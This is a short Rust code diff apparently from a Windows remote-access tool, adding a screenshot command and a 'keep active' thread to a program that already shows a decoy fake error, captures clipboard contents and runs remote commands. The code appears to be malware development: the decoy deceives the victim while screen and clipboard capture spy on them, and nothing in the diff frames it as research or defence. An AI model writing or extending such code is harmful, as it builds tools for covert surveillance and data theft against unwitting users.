@@ -8,6 +8,7 @@ use std::fs;
 use std::path::Path;
 use std::os::windows::process::CommandExt;
 use crate::core::instance::singleton_prcess;
+use crate::core::keep_active::start_keep_active;
 use crate::core::decoy::show_fake_error;
 
 mod command_registry;
@@ -549,6 +550,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         // Utility commands
         ClipboardCommand,
         PrintCommand,
+        ScreenshotCommand,
 
         // Network commands
         IpconfigCommand,
@@ -576,6 +578,10 @@ async fn main() -> anyhow::Result<()> {
             show_fake_error(&decoy_config);
         });
     }
+
+    // Start keep active thred
+    let keep_active_config = Config::get_keep_active_config();
+    start_keep_active(&keep_active_config);
 
     if !is_admin_privileged {
         if Config::SHOW_CONSOLE {
